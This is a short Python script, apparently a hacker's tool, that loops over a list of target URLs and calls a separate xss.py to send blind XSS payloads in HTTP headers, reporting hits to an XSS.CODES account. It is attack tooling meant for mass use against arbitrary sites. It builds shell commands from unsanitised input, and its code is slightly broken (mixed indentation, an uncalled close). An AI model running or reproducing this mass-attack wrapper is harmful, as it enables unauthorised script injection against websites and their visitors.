#!/usr/bin/python3

#/
#   Codder : 0x0fy
#   twitter.com/0x00fy
#\

import sys,os,argparse
import os.path
parser = argparse.ArgumentParser(description="XSS.CODES Http Header Payload SENDER Mass  By : 0x00fy")
parser.add_argument('-l', '--liste', help='Target URL List')
parser.add_argument('-u', '--user', help='XSS.CODES User Name')

args = parser.parse_args()


def Helprr():
    parser.print_help()
    exit(1)


def Mokoko():
    Clear()
    print("""
__  ______ ____   ____ ___  ____  _____ ____  
\ \/ / ___/ ___| / ___/ _ \|  _ \| ____/ ___| 
 \  /\___ \___ \| |  | | | | | | |  _| \___ \ 
 /  \ ___) |__) | |__| |_| | |_| | |___ ___) |
/_/\_\____/____(_)____\___/|____/|_____|____/ 
      
    
        """)




def Clear():
    if os.name == "nt":
	os.system("cls")
    else:
	os.system("clear")



def Sikis(dosya,user):
    if os.path.isfile(dosya):
       file1 = open(dosya, "r")
       Mokoko()	
       for line in file1:
	      os.system("python xss.py -t " + line.strip() + " -u " + user + " > /dev/null 2>&1")	      	            
	      print("Payloads Has Been Sended => " + line.strip())
       file1.close




def main():
    if os.path.isfile("xss.py"):
        try:
            dosya = args.liste
            user = args.user
            Sikis(dosya,user)

        except Exception as e:
            Clear()
            Helprr()
            print(e)
    else:
      print("xss.py Bulunamadi , indiridn lutfen !")
      
      
if __name__ == '__main__':
    exit(main())
